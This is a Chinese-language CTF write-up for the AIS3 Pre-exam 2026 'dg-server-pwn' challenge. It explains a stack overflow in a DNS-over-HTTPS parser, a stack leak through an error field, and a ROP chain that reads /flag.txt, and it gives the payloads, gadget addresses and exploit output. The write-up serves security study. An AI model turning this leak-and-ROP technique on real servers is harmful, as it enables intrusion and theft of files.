---
title: "AIS3 Pre-exam 2026 - dg-server-pwn Writeup"
date: "2026-05-19 00:00:00 +0800"
categories: ["CTF Write-ups"]
tags: ["ctf", "ais3-pre-exam-2026", "pwn"]
description: "分析 dg-server parser 的 stack overflow，透過資訊洩漏與 ROP 讀取 flag。"
toc: true
source_url: "https://hackmd.io/zJ6pPbYYTp6Fh7Xos4xqmA"
source_tag: "AIS3_Pre_exam 2026"
---

> 原始筆記：[HackMD](https://hackmd.io/zJ6pPbYYTp6Fh7Xos4xqmA) · 比賽：AIS3 Pre-exam 2026

{% raw %}
> Category: Pwn  
> Files: `dg-server`, `scripts/dg-verify.py`  
> Remote: `chals1.ais3.org:57573`  
> Instancer: `http://chals1.ais3.org:57575`

---


## TL;DR

這題和 `dg-server-rev` 用的是同一支 binary，但這次目標不是把 `TXT` record walking 出來，而是直接利用 parser 的 stack overflow 打 ROP，讀出 `/flag.txt`。

利用流程是：

1. 先通過 instancer 的 PoW，拿到自己的 instance
2. 用 `type=` 參數的 stack overflow 做 info leak
3. 從 `bad_type` 回應裡拿到：
   - stack canary
   - saved `rbp`
   - return address
   - socket fd
4. 再送第二段 payload，做一條很短的 ORW：
   - `openat("/flag.txt", 0, 0)`
   - `pread64(3, .bss, 0x80, 0)`
   - `send_all(sock_fd, .bss, 0x80)`

最後 flag：

```text
AIS3{B4d_bAd_64d_D0H_p4r(rr)rs3r[rr]r_:(((_QQ}
```

## Challenge Setup

題目給的資訊：

```text
python3 dg-verify.py @chals1.ais3.org:57573 www.curious.sleeping A
Flag 在 /flag.txt
Instancer: http://chals1.ais3.org:57575
```


這題和 reverse 版最大的差別是：

- reverse 題是要理解 `NSEC6`
- pwn 題是要直接利用同一支 binary 的 parser bug

---


## Binary Identity

我先比對了 `rev` 和 `pwn` 包裡的 `dg-server`，結果 SHA-256 完全相同。

也就是說：

- reverse 題看到的函式、offset、gadget
- 可以直接拿來做 pwn 題

這點非常重要，因為我前面在 reverse 題已經把 request parser 跑過一遍，知道哪裡最可疑。

---


## Finding the Overflow

關鍵函式是 `sub_40923F`。它會處理 parse 完的 query，尤其是 `type=`。

精簡後邏輯大概是：

```c
_BYTE v14[16];
unsigned __int16 v15;
__int16 v16;
__int16 v17;
_BYTE v18[24];

memset(v14, 0, 0x16);
v15 = parsed_type_len;
v16 = parsed_type_len;
sub_40917F(a1, v14);        // copy decoded type into v14
v12 = sub_408FA6(v14);      // check whether type is valid
```


而真正有問題的是 `sub_40917F`：

```c
for ( i = 0LL; i < *(_QWORD *)(a1 + 264); ++i )
{
    v3 = sub_4084DA(...);
    if ( i <= 0xF )
      v3 = sub_6F53C0(v3);
    *(_BYTE *)(a2 + i) = v3;
}
```


這段的意思是：

- `a2` 指向 stack 上的 `v14`
- `v14` 只有 16 bytes
- 但是 copy 的長度是 `*(_QWORD *)(a1 + 264)`，也就是 parse 出來的 `type` 長度
- 完全沒有 boundary check

所以只要送超長 `type=`，就可以直接往後覆寫：

- `v15`
- `v16`
- `v17`
- `v18`
- canary
- saved `rbp`
- return address

這就是整題的洞。

---


## Turning the Overflow into a Leak

如果只看到 overflow，第一反應通常會是直接 ROP。  
但這支 binary 有 stack canary，所以一定要先 leak。

剛好 `sub_40923F` 在 invalid type 的錯誤路徑裡，自己就提供了一個超好用的 info leak。

錯誤路徑大概是：

```c
sub_4064C6(..., "{\"Status\":4,\"Comment\":\"invalid query type\",");
v6 = v15;
if ( v15 > 0xA0u )
    v6 = 160;
sub_40905F(a2, a3, &v11, "bad_type", v14, v6);
sub_4064C6(..., "}\n");
```


重點在 `sub_40905F(..., "bad_type", v14, v6)`：

- 它會從 `v14` 開始，往後讀 `v6` bytes
- 然後把內容 hex encode 到 JSON 的 `"bad_type"` 欄位裡

而 `v6` 的來源是 `v15`。  
但 `v15` 本身也在 stack 上，剛好可以被我們 overflow 改掉。

再看 type validity check：

```c
v12 = sub_408FA6(v14);
if (v12) { ... } else { invalid path }
```


`sub_408FA6` 會拿 `*(unsigned __int16 *)(a1 + 18)` 也就是 `v16` 來判斷 type 長度是否對得上已知字串。

所以 payload 可以這樣設計：

- 前 16 bytes：隨便填
- bytes 16~17：把 `v15` 改成大值，例如 `0xffff`
- bytes 18~19：把 `v16` 改成不合法值，例如 `0xffff`
- 後面補幾個 bytes 即可

對應 exploit 裡的 leak payload：

```python
payload = b"A" * 16 + b"\xff\xff\xff\xff" + b"B" * 4
```


也就是：

- `v15 = 0xffff`
- `v16 = 0xffff`

結果是：

1. parser 走 invalid type 路徑
2. `bad_type` 會嘗試輸出 65535 bytes
3. 但函式內部又把輸出上限 clamp 到 `160`
4. 所以最後穩定 leak 160 bytes stack data

這個 leak 很漂亮，因為它不需要先撞 canary，只要 24 bytes 就夠了。

---


## Stack Layout and Why the Leak Is Enough

從 decompile / disasm 可以整理出 `sub_40923F` 的 stack 佈局：

```text
rbp-0x40 : v14[16]
rbp-0x30 : v15 (u16)
rbp-0x2e : v16 (u16)
rbp-0x2c : v17 (u16)
rbp-0x20 : v18[24]
rbp-0x08 : canary
rbp+0x00 : saved rbp
rbp+0x08 : return address
```


所以從 `v14` 開始算的 offset 如下：

```text
0x00 : start of v14
0x10 : v15
0x12 : v16
0x38 : canary
0x40 : saved rbp
0x48 : return address
```


我的 exploit 就直接這樣解：

```python
canary = struct.unpack("<Q", data[56:64])[0]
saved_rbp = struct.unpack("<Q", data[64:72])[0]
ret_addr = struct.unpack("<Q", data[72:80])[0]
sock_fd = struct.unpack("<I", data[92:96])[0]
```


除了 canary / `rbp` / `rip` 以外，還能直接撿到 socket fd，這讓後面送 flag 變得更簡單。

---


## Getting an Instance

這題不是直接連一個固定遠端，而是要先透過 instancer。

Instancer 頁面會給：

- `challenge_id`
- 一份 PoW solver source

它的 PoW 規則很單純：

```python
sha256(f"{challenge}:{nonce}")
```


要求 hash 前面有 `difficulty` 個 zero bits。

我的做法不是執行遠端提供的 solver，而是：

1. 抓 solver source
2. parse 出 `challenge` 和 `difficulty`
3. 在本地 brute force nonce
4. `POST /start` 啟動 instance

對應 code：

```python
solver = self.get(f"/pow/solver/{challenge_id}")
m = re.search(r'challenge\s*=\s*"([0-9a-fA-F]+)"', solver)
challenge = m.group(1)
m = re.search(r'difficulty\s*=\s*(\d+)', solver)
difficulty = int(m.group(1))

nonce = solve_pow(challenge, difficulty)
html = self.post("/start", {"challenge_id": challenge_id, "nonce": str(nonce)})
```


而 `solve_pow` 很直白：

```python
def solve_pow(challenge: str, difficulty: int) -> int:
    target_bytes = difficulty // 8
    target_bits = difficulty % 8
    nonce = 0
    while True:
        h = hashlib.sha256(f"{challenge}:{nonce}".encode()).digest()
        if h[:target_bytes] == b"\x00" * target_bytes:
            if target_bits == 0 or (h[target_bytes] >> (8 - target_bits)) == 0:
                return nonce
        nonce += 1
```


---


## Proving RIP Control

在直接打 ORW 之前，我先做了一個很小的驗證：

- 不急著讀 `/flag.txt`
- 只 ret 到 binary 自己的 `send_all`
- 把一段 `ROP_OK_MARKER\n` 送回 socket

這一步很值得做，因為它能確認三件事：

1. canary 解得對
2. return address 蓋得對
3. stack 上資料指標算得對

我最後用的 `send_all` 函式在：

```text
SEND_ALL = 0x4093DB
```


它的 prototype 很友善：

```c
void __fastcall sub_4093DB(unsigned int fd, void *buf, size_t len)
```


所以只要準備：

- `rdi = sock_fd`
- `rsi = marker_addr`
- `rdx = len(marker)`

就可以把 marker 送回來。

對應 ROP：

```python
chain = b"".join(
    [
        p64(RET),
        p64(POP_RDI_RET),
        p64(leak.sock_fd),
        p64(POP_RSI_RET),
        p64(leak.vuln_stack_base + marker_offset),
        p64(POP_RDX_RET),
        p64(len(marker)),
        p64(SEND_ALL),
        p64(0),
        marker,
    ]
)
```


我實際打回來的結果是：

```text
ROP_OK_MARKER
```


到這裡就表示 exploit 鏈沒問題了。

---


## Building the Final ORW Chain

接下來就是正式讀 flag。

### 為什麼不用 raw syscall

一開始也可以直接找 `syscall; ret` 打 `open/read/write`。  
但這支 binary 本身就有很好用的 wrapper：

- `OPENAT = 0x73F8E0`
- `PREAD64 = 0x7993F0`
- `SEND_ALL = 0x4093DB`

這樣做有幾個好處：

1. 不用管 syscall ABI 的細節
2. 不用煩 `rax` 的系統呼叫號
3. 可以直接重用 binary 自己的 helper

### 為什麼用 `pread64`

`openat` 回來的 fd 幾乎可以假設是 `3`：

- listener / client socket 已經存在
- child process 裡可預期 `open("/flag.txt")` 會拿到下一個最小可用 fd

然後我選 `pread64` 而不是 `read`，原因是：

- binary 裡直接有現成 wrapper
- 只要再補一個 `pop rcx; ret`，把 offset 設成 `0`
- 整條鏈很短

### 最後使用的 gadget / function

```python
POP_RDI_RET = 0x69A383
POP_RSI_RET = 0x46958E
POP_RDX_RET = 0x69B7F5
POP_RCX_RET = 0x6AE19B
RET         = 0x40101F

OPENAT      = 0x73F8E0
PREAD64     = 0x7993F0
SEND_ALL    = 0x4093DB
BSS         = 0x8F9000
```


### 最終鏈

```python
chain = b"".join(
    [
        p64(RET),
        p64(POP_RDI_RET),
        p64(path_addr),        # "/flag.txt"
        p64(POP_RSI_RET),
        p64(0),                # flags
        p64(POP_RDX_RET),
        p64(0),                # mode
        p64(OPENAT),

        p64(POP_RDI_RET),
        p64(3),                # fd from openat
        p64(POP_RSI_RET),
        p64(BSS),
        p64(POP_RDX_RET),
        p64(0x80),
        p64(POP_RCX_RET),
        p64(0),                # offset
        p64(PREAD64),

        p64(POP_RDI_RET),
        p64(leak.sock_fd),
        p64(POP_RSI_RET),
        p64(BSS),
        p64(POP_RDX_RET),
        p64(0x80),
        p64(SEND_ALL),
        p64(0),
        path,
    ]
)
```


整條邏輯就是：

```text
openat("/flag.txt", 0, 0)
pread64(3, .bss, 0x80, 0)
send_all(sock_fd, .bss, 0x80)
```


然後 response body 就直接帶著 flag 回來。

---


## Full Exploit Script

完整 exploit 在：

- `solve_dg_server_pwn.py`（原筆記中的本機檔案，未附於 HackMD）

直接執行：

```bash
python solve_dg_server_pwn.py
```


它會自動：

1. 解 instancer PoW
2. 啟動或重用 instance
3. leak canary / `rbp` / `rip` / socket fd
4. 送 ORW payload
5. 從 response 內抓 `AIS3{...}`

成功輸出長這樣：

```text
[+] challenge_id = pow-xxxxxxxxxxxxxxxxxxxxxxxxxx
[+] connect      = chals1.ais3.org:57573
[+] canary       = 0x4011b985fd70c200
[+] saved_rbp    = 0x00007ffd8d40ab60
[+] ret_addr     = 0x00000000004095e4
[+] sock_fd      = 4
[+] response_len = 128
b'AIS3{B4d_bAd_64d_D0H_p4r(rr)rs3r[rr]r_:(((_QQ}\n...'
[+] flag = AIS3{B4d_bAd_64d_D0H_p4r(rr)rs3r[rr]r_:(((_QQ}
```


---


## Flag

```text
AIS3{B4d_bAd_64d_D0H_p4r(rr)rs3r[rr]r_:(((_QQ}
```
{% endraw %}
